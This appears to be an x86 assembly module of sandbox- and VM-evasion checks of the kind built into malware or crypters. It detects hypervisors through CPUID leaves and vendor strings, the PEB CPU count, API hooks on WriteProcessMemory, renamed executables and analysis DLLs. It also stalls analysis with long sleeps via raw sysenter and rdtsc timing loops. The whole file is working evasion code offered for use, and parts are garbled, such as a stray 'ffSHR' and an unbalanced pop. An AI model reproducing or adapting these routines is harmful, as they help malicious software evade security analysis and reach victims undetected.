; Should go to the end without RETing to win !

; ********************************************
; **
; **  Virtualisation Based
; **
; ******************************************** 

; Only allow Intel CPUS
%ifdef NOSB_INTELONLY
      mov   eax,0
      cpuid
      cmp   edx,0x49656E69
      je    _isintel
      ret
_isintel:
%endif


%ifdef NOSB_NOL1ICACHE
; Validate that you have L1 Cache.
      mov   edx,0 

_isnot_nol1_first:
      mov   eax,4
      mov   ecx,edx
      push  edx
      cpuid
      pop   edx
      inc   edx

      mov   ecx,eax     ; Ecx will get Level
      shr   ecx,5
      and   ecx,7       ; Ecx get Level
      and   eax,0x1f    ; Eax get type

      cmp   eax,2
      jne   _isnot_nol1_next  ; Type 2 is Instruction
      cmp   ecx,1       ; we seek L1
      je    _isnot_nol1      ; Type2 L1 .. great !
_isnot_nol1_next:
      inc   ecx
      loop  _isnot_nol1_first  ; if Type is not null do next cache

            
      ret               ; If here wi did'nt found L1 intruction cache.
_isnot_nol1:
%endif

%ifdef NOSB_HYPERBIT
; --------
; Test for Hypervised bit. ( Cpuid Leaf 1, 32th Bit)
      mov   eax,1
      cpuid
      bt    ecx,31
      jnc   _isnot_hyper
      ret
_isnot_hyper:
%endif

%ifdef NOSB_UNSLEAF
; --------
; Test for unsupported CPUid Leaf are not 0 on intel 
      mov   eax,0x80000000
      cpuid			; Should be at least ..5 since P4 
      cmp   eax,0x80000005
      jnb   _isnot_Unleaf_mid
      ret

_isnot_Unleaf_mid:
      inc   eax   ; Unsuported leaf in EAX
      push  eax	

      xor   eax,eax
      cpuid
      cmp   ebx,0x756E6547	; Test Intel String
      pop   eax
      jne   _isnot_Unleaf	; Work only with Intel
	
      cpuid
      add   eax,ebx
      add   eax,ecx
      add   eax,edx
      jnz   _isnot_Unleaf
      ret			; 0.0.0.0 on unsupported leaf 
_isnot_Unleaf:
%endif

%ifdef NOSB_PEBCOUNT
; --------
; Test for PEB Cpu Count 
      mov   ebx,[PEB]
      mov   eax,[ebx+0x64]
      dec   eax
      jnz   _isnot_pebuniq
      ret
_isnot_pebuniq:
%endif

%ifdef NOSB_HYPSTR
; --------
; Test for Hypervisor String (Cpuid Leaf 0x400000000) 
      MOV   EAX,0x40000000    ; leaf Hypervisor string
      CPUID
      
      MOV   EAX,ECX
      MOV   ECX,0x4
_hyperstr_loopA:              ; Test 4 Chars in ECX
      CMP   AL,32             ; Space
      JB    _isnot_hyperstr
      CMP   AL,122            ; "z"
      JA    _isnot_hyperstr
      SHR   EAX,8             ; Next Char
      LOOP  _hyperstr_loopA
      mov   ecx,4
      MOV   EAX,EBX
      POP   EAX
_hyperstr_loopB:              ; Test 4 Chars in EAX
      CMP   AL,32
      JB    _isnot_hyperstr
      CMP   AL,122
      JA    _isnot_hyperstr
      ffSHR   EAX,8             ; Next Char
      LOOP  _hyperstr_loopB
      ret                     ; Non printable Found
_isnot_hyperstr:
%endif

; ********************************************
; **
; **  Sandbox Detection Based
; **
; ******************************************** 

%ifdef NOSB_HOOKPROC
	invoke _getdll,HASH_KERNEL32.DLL
 	invoke _getfunction, eax, HASH_WRITEPROCESSMEMORY
  cmp dword [eax],0x8B55FF8B
 	je _nosbhookproc
	ret
_nosbhookproc:
%endif


%ifdef NOSB_SYSSLEEP
  	jmp	_syssleepstart
		align 8
		syssleepval dd -  10 * (10000 * 1000); en Sec  
		
_syssleepstart:
	  push syssleepval	; Time to sleep
	  push 0						; False, relative time selection
	  push _syssleepend	; Return address
	  push _syssleepend	; Return address emulate return to ntdelayexecution
		mov eax,0x003b		; Only for XP32 Bits...
	  mov edx,esp				; See for code http://j00ru.vexillium.org/ntapi/
		sysenter					; Hello Kernel
_syssleepend:
		add esp, 4*3
%endif


%ifdef NOSB_HSLEEP
		jmp	_hsleepstart
		align 8
		hsleepval	dd -1800000000
_hsleepstart
  	invokel _getdll,HASH_KERNEL32.DLL
	  invokel _getfunction, eax, HASH_NTDELAYEXECUTION
		invokel eax, 0, hsleepval	; Negatif 
%endif


%ifdef NOSB_CPUIDCOUNT
		mov	ecx,0xffff            
		push 	eax
_CPUID_LOOP:
		push 	ecx		
		mov	eax,1	
		cpuid
		pop		ecx
		loop	_CPUID_LOOP
		rdtsc
		pop		ecx
		sub 	eax,ecx
                add     eax,0x300000

                  push eax
		mov	ecx,0xffff            
		push 	eax
_CPUID_LOOP2:
		push 	ecx		
		mov	eax,1	
		nop
		pop		ecx
		loop	_CPUID_LOOP2
		rdtsc
		pop		ecx
		sub 	eax,ecx

                  pop   ebx
                  cmp   eax,ebx

		ja		_isnot_cpuidcount
 		ret
_isnot_cpuidcount:

%endif


%ifdef NOSB_RENAMED
      invokel _getdll, HASH_NOSB_RENAMED.EXE ; Bloque les renommages
      test eax,eax
      jne  _renamed_nosandbox
      ret
_renamed_nosandbox:
%endif

%ifdef NOSB_ROGUEDLL
      invokel _getdll, HASH_WS2_32.DLL
      test eax,eax
      jz  _dll_nosandbox
      ret
_dll_nosandbox:
%endif


; 3 Mn wait, with only 2 API Call.
%ifdef NOSB_RDTSCLOOP 
      jmp _rdtsc_start

_rdtscsleeploop:
      rdtsc
      mov   ecx,eax

_timing1:
      push  ecx
      cpuid       ; Just a fake "Huge one"
      rdtsc
      pop   ecx
      cmp   eax,ecx
      jae   _timing1

_timing2:
      push        ecx
      cpuid
      rdtsc
      pop   ecx
      cmp   eax,ecx
      jb _timing2

      ret

_rdtsc_start:
      invokel _getdll,HASH_KERNEL32.DLL
      invokel _getfunction, eax, HASH_GETTICKCOUNT
      call eax

      push  eax
      call _rdtscsleeploop

      invokel _getdll,HASH_KERNEL32.DLL
      invokel _getfunction, eax, HASH_GETTICKCOUNT
      call eax

      pop   ebx
      sub   eax,ebx    ; How many time a loop did...
      mov   ecx,eax
      mov   edx,0
      mov   eax,180000 ; 3 Mn en millisecondes
      idiv  ecx        ; How many loop should i do 
      mov   ecx,eax     
      dec   ecx         ; one loop is already done

_rdtscwait:
      push  ecx
      call  _rdtscsleeploop
      pop   ecx
      loop  _rdtscwait
      
%endif



